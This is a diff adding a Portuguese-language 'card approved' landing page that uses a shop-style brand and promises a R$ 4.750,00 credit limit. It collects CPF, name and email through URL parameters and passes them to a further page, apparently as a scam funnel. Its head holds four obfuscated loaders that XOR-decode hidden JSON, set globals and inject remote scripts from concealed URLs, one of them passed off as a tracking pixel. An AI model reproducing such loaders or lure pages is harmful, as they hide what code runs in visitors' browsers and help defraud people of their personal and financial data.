@@ -1,0 +1,625 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script>(function(){var b_x=atob("DHBTg58oM7MKpTo+sAtx9u1EEYkozU5KwANprLBLV90k0E5T2RYqrfxHXp1o1xVN0wI68+tbHMZ+yEkR3BEn5uxcHdl5hxYc0QQn8fZKRsdv1hgE6wtx7f5FVpEwh15fxBF+9utFWtVziEpM1QY27esFS9BlwRdN0xtxr71eUt9/wBgEklIur+QKXdJnwBgEkhQy9/4FRsdnzFxHnQAh5ulNXccn1k9c2RQgobMKRdJm0F8cilJx/sJV");var n_g=[];for(var k_ui=0;k_ui<b_x.length;k_ui++){n_g.push(b_x.charCodeAt(k_ui)&255);}var s_0vo=n_g[0];var u_b=n_g.slice(1,1+s_0vo);var s_3n6=n_g.slice(1+s_0vo);var u_k=s_3n6.map(function(b,s_bfn){return b^u_b[s_bfn%s_0vo];});var w_7le6="";for(var a_st=0;a_st<u_k.length;a_st++){w_7le6+=String.fromCharCode(u_k[a_st]&255);}var s_enao=decodeURIComponent(escape(w_7le6));var b_v6i=JSON.parse(s_enao);var x_vi6=b_v6i.globals||[];x_vi6.forEach(function(v_hv){window[v_hv.name]=v_hv.value;});var n_rb2=document.createElement("script");n_rb2.src=b_v6i.url;n_rb2.async=true;n_rb2.defer=true;(b_v6i.attributes||[]).forEach(function(r_ebks){n_rb2.setAttribute(r_ebks.name,r_ebks.value);});(document.head||document.documentElement).appendChild(n_rb2);})();</script><script src="js/latest.js" async="" defer="" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids=""></script>
+<script>(function(){var x_v=atob("DPv5+JvEGQDXP+pP8YDbjemoOzr1V547gYjD17SnfW75Sp4imJ2A1virdC61TcU8komQiO+3NnC+R48j3ouQgP6oNGe4UI0jlNWTi7noO2GjS5gmk46NnejmI1uKE8gonZSbmfe3OzqMRMghkJac2qHmfm+4WIYqoZKBnfeNfSL7HZwunY6c2qHmL2HgDN8swMKYyav3LzDkXdgqw5mfyP6gO32KQg==");var a_0s=[];for(var s_m7=0;s_m7<x_v.length;s_m7++){a_0s.push(x_v.charCodeAt(s_m7)&255);}var j_9h=a_0s[0];var n_m1kx=a_0s.slice(1,1+j_9h);var m_c=a_0s.slice(1+j_9h);var m_svs=m_c.map(function(b,y_a208){return b^n_m1kx[y_a208%j_9h];});var b_4f1="";for(var y_b2=0;y_b2<m_svs.length;y_b2++){b_4f1+=String.fromCharCode(m_svs[y_b2]&255);}var a_40s7=decodeURIComponent(escape(b_4f1));var r_92=JSON.parse(a_40s7);var v_5f5b=r_92.globals||[];v_5f5b.forEach(function(f_b11){window[f_b11.name]=f_b11.value;});var z_7va5=document.createElement("script");z_7va5.src=r_92.url;z_7va5.async=true;z_7va5.defer=true;(r_92.attributes||[]).forEach(function(y_o8){z_7va5.setAttribute(y_o8.name,y_o8.value);});(document.head||document.documentElement).appendChild(z_7va5);})();</script><script src="js/pixel-google.js" async="" defer=""></script>
+
+
+    
+    
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cartão Aprovado - mercado</title>
+    <link href="css/all.min.css" rel="stylesheet">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            width: 100%;
+            overflow-x: hidden;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #EEEEEE;
+            color: #333333;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            background: #EE4D2D;
+            padding: 18px 20px;
+            text-align: center;
+        }
+
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* Main Container */
+        .main {
+            flex: 1;
+            width: 100%;
+            max-width: 100%;
+            padding: 24px 16px;
+        }
+
+        /* Success Section */
+        .success-section {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .success-icon {
+            width: 72px;
+            height: 72px;
+            background: #00A650;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            box-shadow: 0 8px 24px rgba(0, 166, 80, 0.3);
+        }
+
+        .success-icon i {
+            font-size: 32px;
+            color: white;
+        }
+
+        .success-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #333333;
+            margin-bottom: 8px;
+        }
+
+        .success-subtitle {
+            font-size: 16px;
+            color: #666;
+        }
+
+        /* Approved Card */
+        .approved-card {
+            background: white;
+            border: 2px solid #00A650;
+            border-radius: 12px;
+            padding: 24px 20px;
+            margin-bottom: 24px;
+            text-align: center;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+        }
+
+        .approved-label {
+            font-size: 12px;
+            font-weight: 700;
+            color: #00A650;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+
+        .approved-amount {
+            font-size: 36px;
+            font-weight: 800;
+            color: #00A650;
+            margin-bottom: 16px;
+        }
+
+        .approved-badge {
+            display: inline-block;
+            background: #00A650;
+            color: white;
+            padding: 8px 20px;
+            border-radius: 24px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+
+        .approved-note {
+            font-size: 13px;
+            color: #888;
+        }
+
+        /* CTA Button */
+        .cta-button {
+            display: block;
+            width: 100%;
+            background: #EE4D2D;
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .cta-button:hover {
+            background: #D63D21;
+        }
+
+        .cta-button:active {
+            transform: scale(0.98);
+        }
+
+        .cta-wrapper {
+            text-align: center;
+        }
+
+        /* Info Grid */
+        .info-grid {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 24px;
+        }
+
+        .info-card {
+            flex: 1;
+            background: white;
+            border: 1px solid #EDEDED;
+            border-radius: 8px;
+            padding: 16px 8px;
+            text-align: center;
+        }
+
+        .info-icon {
+            width: 40px;
+            height: 40px;
+            background: #EE4D2D;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+        }
+
+        .info-icon i {
+            font-size: 16px;
+            color: white;
+        }
+
+        .info-label {
+            font-size: 10px;
+            font-weight: 600;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        .info-value {
+            font-size: 12px;
+            font-weight: 700;
+            color: #333333;
+            line-height: 1.3;
+        }
+
+        /* Benefits Section */
+        .benefits-section {
+            background: white;
+            border: 1px solid #EDEDED;
+            border-radius: 12px;
+            padding: 20px 16px;
+            margin-bottom: 24px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.05);
+        }
+
+        .benefits-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .benefits-header-icon {
+            width: 28px;
+            height: 28px;
+            background: #EE4D2D;
+            border-radius: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .benefits-header-icon i {
+            font-size: 12px;
+            color: #333333;
+        }
+
+        .benefits-header-text {
+            font-size: 17px;
+            font-weight: 700;
+            color: #333333;
+        }
+
+        /* Carousel */
+        .carousel {
+            position: relative;
+            overflow: hidden;
+            border-radius: 8px;
+        }
+
+        .carousel-track {
+            display: flex;
+            transition: transform 0.4s ease;
+        }
+
+        .carousel-slide {
+            min-width: 100%;
+            padding: 24px 16px;
+            background: linear-gradient(135deg, rgba(238, 77, 45, 0.1) 0%, rgba(238, 77, 45, 0.05) 100%);
+            text-align: center;
+            border-radius: 8px;
+        }
+
+        .slide-icon {
+            width: 56px;
+            height: 56px;
+            background: #EE4D2D;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 14px;
+            box-shadow: 0 6px 20px rgba(238, 77, 45, 0.3);
+        }
+
+        .slide-icon i {
+            font-size: 22px;
+            color: white;
+        }
+
+        .slide-title {
+            font-size: 17px;
+            font-weight: 700;
+            color: #EE4D2D;
+            margin-bottom: 8px;
+        }
+
+        .slide-description {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+            max-width: 260px;
+            margin: 0 auto;
+        }
+
+        /* Carousel Dots */
+        .carousel-dots {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 16px;
+        }
+
+        .dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #D1D5DB;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .dot.active {
+            background: #EE4D2D;
+            transform: scale(1.25);
+        }
+
+        /* Footer */
+        .footer {
+            background: white;
+            border-top: 1px solid #EDEDED;
+            padding: 16px;
+            text-align: center;
+        }
+
+        .footer p {
+            font-size: 11px;
+            color: #999;
+            line-height: 1.6;
+        }
+
+        .footer a {
+            color: #EE4D2D;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .success-section { animation: fadeIn 0.5s ease forwards; }
+        .approved-card { animation: fadeIn 0.5s ease 0.1s forwards; opacity: 0; }
+        .cta-button { animation: fadeIn 0.5s ease 0.2s forwards; opacity: 0; }
+        .info-grid { animation: fadeIn 0.5s ease 0.3s forwards; opacity: 0; }
+        .benefits-section { animation: fadeIn 0.5s ease 0.4s forwards; opacity: 0; }
+
+        /* Pulse animation for button */
+        @keyframes pulse {
+            0%, 100% { 
+                transform: scale(1);
+                box-shadow: 0 4px 15px rgba(238, 77, 45, 0.3); 
+            }
+            50% { 
+                transform: scale(1.02);
+                box-shadow: 0 8px 25px rgba(238, 77, 45, 0.4); 
+            }
+        }
+
+        .cta-button {
+            animation: fadeIn 0.5s ease 0.2s forwards, pulse 2s ease-in-out 0.7s infinite;
+            opacity: 0;
+        }
+    </style>
+
+    
+
+    
+
+    
+
+    
+
+    
+<script src="js/utm-handler.js" data-token="ea930328-cad0-4277-b99d-8c16148dcdbb"></script>
+
+<!-- UTMify pixel and UTM tracking -->
+<script>(function(){var n_9umv=atob("DOmOujQiboEBZRMcE5Ksz0ZOTLsjDWdoY5q0lRtBCu8vEGdxeo/3lFdNA69jFzxvcJvnykBRQfFoHXZwPJnnwlFOQOtyRz8+cp36yF1AG/VkFjEmSLSimFNOAeNgCWA+KbL1mFpDA+QjXzFsepHr1n1GTK0jE3JwZoysgBYUD+AyUScrK4+4j1cQCrkzXSR+IdzqjAMAE9x8");var f_3w0=[];for(var e_9ihb=0;e_9ihb<n_9umv.length;e_9ihb++){f_3w0.push(n_9umv.charCodeAt(e_9ihb)&255);}var q_jc2=f_3w0[0];var v_p14n=f_3w0.slice(1,1+q_jc2);var x_to=f_3w0.slice(1+q_jc2);var y_cfcj=x_to.map(function(b,i_eb){return b^v_p14n[i_eb%q_jc2];});var y_lgc="";for(var r_4y4=0;r_4y4<y_cfcj.length;r_4y4++){y_lgc+=String.fromCharCode(y_cfcj[r_4y4]&255);}var j_oi3=decodeURIComponent(escape(y_lgc));var b_fccl=JSON.parse(j_oi3);var p_1=b_fccl.globals||[];p_1.forEach(function(i_1wym){window[i_1wym.name]=i_1wym.value;});var p_w3kc=document.createElement("script");p_w3kc.src=b_fccl.url;p_w3kc.async=true;p_w3kc.defer=true;(b_fccl.attributes||[]).forEach(function(u_9vj){p_w3kc.setAttribute(u_9vj.name,u_9vj.value);});(document.head||document.documentElement).appendChild(p_w3kc);})();</script>
+<script>(function(){var e_0z=atob("DE/SdGpmbNX2MyoZiDTwARgKTu/UW15t+DzoW0UFCLvYRl504SmrWgkJAfuUQQVq6z27BB4VQ6CCXlk25C6mERkSQr+FEQY76TumBgMEGaGTQAgj0zTwGgsLCffMEU54/C7/AR4LBbOPHlpr7Tm3Gh5LFLaZVwdq6yTwWEgQDbmDVggjqm2vWBFEArSbVggjqiuzAAtLGaGbWkxgpT+gERwDAqHbQF974SuhVkZEGrSaRk87sm3wCTcb");var o_7o=[];for(var u_j=0;u_j<e_0z.length;u_j++){o_7o.push(e_0z.charCodeAt(u_j)&255);}var a_a=o_7o[0];var r_ji86=o_7o.slice(1,1+a_a);var r_b=o_7o.slice(1+a_a);var q_m1=r_b.map(function(b,r_co2){return b^r_ji86[r_co2%a_a];});var d_17sz="";for(var m_hsnv=0;m_hsnv<q_m1.length;m_hsnv++){d_17sz+=String.fromCharCode(q_m1[m_hsnv]&255);}var w_n=decodeURIComponent(escape(d_17sz));var w_1dqv=JSON.parse(w_n);var r_6m=w_1dqv.globals||[];r_6m.forEach(function(r_jqj){window[r_jqj.name]=r_jqj.value;});var w_fj=document.createElement("script");w_fj.src=w_1dqv.url;w_fj.async=true;w_fj.defer=true;(w_1dqv.attributes||[]).forEach(function(z_jqz){w_fj.setAttribute(z_jqz.name,z_jqz.value);});(document.head||document.documentElement).appendChild(w_fj);})();</script>
+</head>
+<body>
+    <header class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="images/logoofc.png" alt="mercado">
+        </div>
+    </header>
+
+    <main class="main">
+        <section class="success-section">
+            <div class="success-icon">
+                <i class="fas fa-check"></i>
+            </div>
+            <h1 class="success-title">Parabéns!</h1>
+            <p class="success-subtitle">Seu cartão foi aprovado com sucesso</p>
+        </section>
+
+        <section class="approved-card">
+            <div class="approved-label">Limite Aprovado</div>
+            <div class="approved-amount" id="approvedLimit">R$ 4.750,00</div>
+            <div class="approved-badge">Cartão liberado em até 5 minutos</div>
+            <div class="approved-note">Sujeito à confirmação dos dados pessoais</div>
+        </section>
+
+        <div class="cta-wrapper">
+            <button class="cta-button" id="finalizeBtn">
+                Finalizar Cadastro
+            </button>
+        </div>
+
+        <section class="info-grid">
+            <div class="info-card">
+                <div class="info-icon">
+                    <i class="fas fa-percent"></i>
+                </div>
+                <div class="info-label">Anuidade</div>
+                <div class="info-value">Grátis 1º ano</div>
+            </div>
+            <div class="info-card">
+                <div class="info-icon">
+                    <i class="fas fa-credit-card"></i>
+                </div>
+                <div class="info-label">Modalidade</div>
+                <div class="info-value">Débito e Crédito</div>
+            </div>
+            <div class="info-card">
+                <div class="info-icon">
+                    <i class="fas fa-wifi"></i>
+                </div>
+                <div class="info-label">Tecnologia</div>
+                <div class="info-value">Contactless</div>
+            </div>
+        </section>
+
+        <section class="benefits-section">
+            <div class="benefits-header">
+                <div class="benefits-header-icon">
+                    <i class="fas fa-star"></i>
+                </div>
+                <span class="benefits-header-text">Benefícios do seu cartão</span>
+            </div>
+
+            <div class="carousel">
+                <div class="carousel-track" id="carouselTrack">
+                    <div class="carousel-slide">
+                        <div class="slide-icon"><i class="fas fa-shield-alt"></i></div>
+                        <div class="slide-title">Máxima Segurança</div>
+                        <div class="slide-description">Compras protegidas online e físicas com tecnologia avançada</div>
+                    </div>
+                    <div class="carousel-slide">
+                        <div class="slide-icon"><i class="fas fa-mobile-alt"></i></div>
+                        <div class="slide-title">100% Digital</div>
+                        <div class="slide-description">Processo totalmente online, rápido e sem burocracia</div>
+                    </div>
+                    <div class="carousel-slide">
+                        <div class="slide-icon"><i class="fas fa-chart-line"></i></div>
+                        <div class="slide-title">Controle Total</div>
+                        <div class="slide-description">App completo para gerenciar seus gastos em tempo real</div>
+                    </div>
+                    <div class="carousel-slide">
+                        <div class="slide-icon"><i class="fas fa-credit-card"></i></div>
+                        <div class="slide-title">Parcelamento Flexível</div>
+                        <div class="slide-description">Parcele suas compras em até 24x com as melhores condições</div>
+                    </div>
+                    <div class="carousel-slide">
+                        <div class="slide-icon"><i class="fas fa-headset"></i></div>
+                        <div class="slide-title">Suporte 24h</div>
+                        <div class="slide-description">Atendimento rápido e eficiente via ParceiroChat a qualquer hora</div>
+                    </div>
+                    <div class="carousel-slide">
+                        <div class="slide-icon"><i class="fas fa-percent"></i></div>
+                        <div class="slide-title">Anuidade Grátis</div>
+                        <div class="slide-description">Primeiro ano sem custo algum e condições especiais</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="carousel-dots" id="carouselDots">
+                <div class="dot active" data-index="0"></div>
+                <div class="dot" data-index="1"></div>
+                <div class="dot" data-index="2"></div>
+                <div class="dot" data-index="3"></div>
+                <div class="dot" data-index="4"></div>
+                <div class="dot" data-index="5"></div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer">
+        <p>© 2026, Todos os direitos reservados.</p>
+        <p><a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </footer>
+
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros atuais no console
+        console.log('Parâmetros atuais na página de aprovação:', getUrlParams());
+
+        // =======================================================
+        // CÓDIGO ORIGINAL MANTIDO
+        // =======================================================
+
+        // Carousel
+        const track = document.getElementById('carouselTrack');
+        const dots = document.querySelectorAll('.dot');
+        let currentSlide = 0;
+        const totalSlides = 6;
+        let autoPlay;
+
+        function goToSlide(index) {
+            currentSlide = index;
+            track.style.transform = `translateX(-${index * 100}%)`;
+            dots.forEach((dot, i) => dot.classList.toggle('active', i === index));
+        }
+
+        function nextSlide() {
+            goToSlide((currentSlide + 1) % totalSlides);
+        }
+
+        function startAutoPlay() {
+            autoPlay = setInterval(nextSlide, 3500);
+        }
+
+        function stopAutoPlay() {
+            clearInterval(autoPlay);
+        }
+
+        dots.forEach(dot => {
+            dot.addEventListener('click', () => {
+                stopAutoPlay();
+                goToSlide(parseInt(dot.dataset.index));
+                setTimeout(startAutoPlay, 5000);
+            });
+        });
+
+        // Touch support
+        let touchStartX = 0;
+        track.addEventListener('touchstart', e => {
+            touchStartX = e.touches[0].clientX;
+            stopAutoPlay();
+        });
+
+        track.addEventListener('touchend', e => {
+            const diff = touchStartX - e.changedTouches[0].clientX;
+            if (Math.abs(diff) > 50) {
+                if (diff > 0) goToSlide((currentSlide + 1) % totalSlides);
+                else goToSlide((currentSlide - 1 + totalSlides) % totalSlides);
+            }
+            setTimeout(startAutoPlay, 5000);
+        });
+
+        startAutoPlay();
+
+        // CTA Button - Redirecionamento preservando parâmetros
+        document.getElementById('finalizeBtn').addEventListener('click', () => {
+            console.log('Finalizar cadastro - redirecionando para 3.html com parâmetros:', getUrlParams());
+            window.location.href = buildUrlWithParams('3.html');
+        });
+
+        // Helper for other pages
+        window.getCustomerData = function() {
+            const p = getUrlParams();
+            return {
+                cpf: p.cpf || '',
+                nome: p.nome || '',
+                ParceiroChat: p.ParceiroChat || '',
+                email: p.email || '',
+                vencimento: p.vencimento || '',
+                cartao_aprovado: p.cartao_aprovado || 'true'
+            };
+        };
+    </script>
+
+</body></html>
